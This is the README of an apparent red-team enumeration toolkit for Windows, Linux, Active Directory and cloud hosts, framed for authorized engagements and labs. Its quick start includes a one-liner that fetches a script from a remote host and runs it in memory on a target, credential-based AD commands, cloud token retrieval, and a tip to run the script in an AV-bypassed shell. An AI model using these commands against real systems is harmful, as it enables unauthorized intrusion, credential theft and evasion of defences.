# Red Team Enumeration Toolkit

A cross-platform set of **read-only** enumeration scripts for authorized red-team
engagements and lab practice. It generalizes the approach of
[`Invoke-CRTPEnum.ps1`](https://github.com/Jeetramoliya/CRTPAutomatedEnumerationScript)
(the CRTP-lab specialist) into engagement-ready tooling for **Windows, Linux, Active
Directory, and cloud/hybrid** — with one consistent findings model across all of them.

> **Authorized use only.** These scripts are for systems you own or have explicit,
> written permission to test (pentest/red-team engagements, CTFs, your own lab).
> Everything here is read-only recon; it finds and *ranks* targets and prints the
> command you would run next — **you** decide and execute each action.

---

## The scripts

| Script | Platform | Scope |
|---|---|---|
| [`windows/Invoke-RTEnum.ps1`](windows/Invoke-RTEnum.ps1) | Windows (PS 5.1+) | Local host triage **+** full AD enumeration (domain member or standalone) |
| [`linux/rt-linenum.sh`](linux/rt-linenum.sh) | Linux (bash) | Local privilege-escalation triage (SUID, sudo, caps, cron, creds, containers) |
| [`linux/rt-adenum.sh`](linux/rt-adenum.sh) | Linux (bash) | AD enumeration **from** Linux (ldapsearch / netexec / impacket / certipy) |
| [`cloud/rt-cloudenum.sh`](cloud/rt-cloudenum.sh) | Linux (bash) | Cloud metadata (AWS/Azure/GCP IMDS) + CLI session reuse + Kubernetes |
| [`cloud/Invoke-RTCloudEnum.ps1`](cloud/Invoke-RTCloudEnum.ps1) | Windows (PS) | Entra ID / Azure posture (IMDS, dsregcmd/PRT, az/Az sessions, AAD Connect) |

Each is **self-contained** and **degrades gracefully** — it uses optional tools when
present (RSAT/PowerView, netexec, impacket, certipy, az/aws/gcloud) and falls back to
native primitives (raw LDAP, `find`, curl to IMDS) when they are not.

---

## Shared output model

Every script writes a **timestamped loot directory** containing:

```
<out>/<kind>_<target>_<timestamp>/
    00_SUMMARY.txt     ranked HIGH / MED / INFO findings  (read first)
    NEXT_STEPS.txt     the pre-filled command for each actionable finding
    NN_*.txt/.json     per-section raw dumps
    findings.json      machine-readable (with -j / -Json)
```

Findings are ranked and de-duplicated:

- **HIGH** — directly actionable / likely to yield access (do first)
- **MED**  — promising, needs a condition met or more work
- **INFO** — context and inventory

The summary ends with a **recommended next move** so you spend time acting, not
re-typing recon. Re-run after each hop as the new identity — that is the core loop.

---

## Quick start

### Windows (local + AD)
```powershell
. .\windows\Invoke-RTEnum.ps1
Invoke-RTEnum                      # local host + current domain
Invoke-RTEnum -LocalOnly           # host triage only
Invoke-RTEnum -Domain corp.local -Credential (Get-Credential) -Json
Invoke-RTEnum -Only users,acls,delegation      # scope sections
Invoke-RTEnum -Target srv01 -HostSweep         # opt in to loud host sweeps
```

### Linux (local privesc)
```bash
chmod +x linux/rt-linenum.sh
./linux/rt-linenum.sh -o /dev/shm -j
# memory-only on target:  bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
```

### AD from Linux
```bash
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -p 'Passw0rd!' -j
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -H <NTLM-hash>
./linux/rt-adenum.sh -d corp.local --dc 10.0.0.10 -k        # host Kerberos ccache
```

### Cloud / hybrid
```bash
./cloud/rt-cloudenum.sh -j                 # autodetect AWS/Azure/GCP, reuse CLI sessions
./cloud/rt-cloudenum.sh --no-token         # identify only, don't fetch tokens
```
```powershell
. .\cloud\Invoke-RTCloudEnum.ps1 ; Invoke-RTCloudEnum -Json
```

---

## Noise posture

- **Default = quiet.** Local host checks and normal-looking LDAP only.
- **Loud sweeps are opt-in.** On Windows, host-touching sweeps (admin-access / share
  enumeration across every computer) run only with `-HostSweep` or scoped `-Target`.
- Cloud token retrieval is a credential-access action — gated behind `--no-token`
  to skip it, and the PowerShell cloud script only *detects* identity artifacts
  (PRT, managed identity, live sessions) rather than extracting them.

## AV / Defender note

`NEXT_STEPS.txt` embeds offensive tool command **strings** (Rubeus, impacket,
certipy, secretsdump, etc.). On Windows, Defender real-time protection may quarantine
the output or the `.ps1` on load. In your own lab, load inside a bypassed shell or add
a tools-folder exclusion. Syntax-checking never executes anything:
```powershell
[System.Management.Automation.Language.Parser]::ParseFile('.\windows\Invoke-RTEnum.ps1',[ref]$null,[ref]$null)
```

---

## Relationship to Invoke-CRTPEnum

`Invoke-CRTPEnum.ps1` remains the **CRTP-lab specialist** (phase playbook, attack-chain
to Enterprise Admin, lab-tuned exploit commands). This toolkit is the **general-purpose,
cross-platform** sibling: no hardcoded lab domain, explicit local/AD/cloud split, and a
Linux + cloud reach the original didn't cover. They share the same philosophy —
*enumerate, rank, hand you the next command, repeat as the new identity.*
